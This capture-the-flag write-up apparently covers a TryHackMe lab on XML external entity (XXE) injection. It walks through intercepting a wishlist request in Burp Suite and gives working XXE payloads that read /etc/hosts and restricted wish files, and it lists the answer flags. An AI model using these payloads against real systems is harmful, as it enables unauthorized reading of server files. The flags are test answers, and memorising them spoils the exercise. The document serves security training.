# Day 5: SOC-mas XX-what-ee?

**Connection to the Machine:**
To begin, a virtual machine and AttackBox were utilized for the analysis.

## Approach:

- Analyzed the website: http://10.10.158.231/.

  ![image](https://github.com/user-attachments/assets/a9eace36-dfff-4698-9ba2-34b9b4d8a842)

- `Wish #21` indicates that there are 20 more wishes placed by other users.
- Upon clicking `Wish #21`, a forbidden page is encountered which can only be accessed by admins - `/wishes/wish_1.txt`.

  ![image](https://github.com/user-attachments/assets/978c08d8-0fed-44fd-8bd7-829596e7718f)

- Opened Burp Suite.
- Enabled `Allow Burp's browser to run without a sandbox` option from settings.
- Opened Burp's browser from the Proxy -> Intercept tab and went to the given URL: http://10.10.158.231/.
- Clicked `Add to Wishlist` which was logged in Burp Suite. The request contained XML being forwarded as a POST request.
- Sent the POST request to `Repeater`.
- Updated the XML payload with the new data and then sent the modified request.
 
  new payload:
  
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```

![image](https://github.com/user-attachments/assets/7b1e50dc-1243-4737-964e-18198b8adefa)

- Updated the XML payload in order to read the wishes of the townspeople using the `/wishes/wish_1.txt` page and then sent the modified request.

```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
<wishlist>
	<user_id>1</user_id>
	<item>
	       <product_id>&payload;</product_id>
	</item>
</wishlist>
```

![image](https://github.com/user-attachments/assets/66a698a4-9499-4215-a156-c38a8599344c)

- Iterated through the wishes (wish_1.txt, wish_2.txt, ...) and found the flag on wish 15.

![image](https://github.com/user-attachments/assets/69b3c27f-779d-4106-9faf-5ef5a22970b5)

---

## Answers to the given questions:

What is the flag discovered after navigating through the wishes?

```
THM{Brut3f0rc1n6_mY_w4y}
```

---

What is the flag seen on the possible proof of sabotage?

```
THM{m4y0r_m4lw4r3_b4ckd00rs}
```

A CHANGELOG file exists within the web application, stored at the following endpoint: http://10.10.158.231/CHANGELOG

![image](https://github.com/user-attachments/assets/e5e9397e-678a-49db-a603-54a96573e93a)

---

![image](https://github.com/user-attachments/assets/5087481b-2962-411a-93ac-e242567b509b)
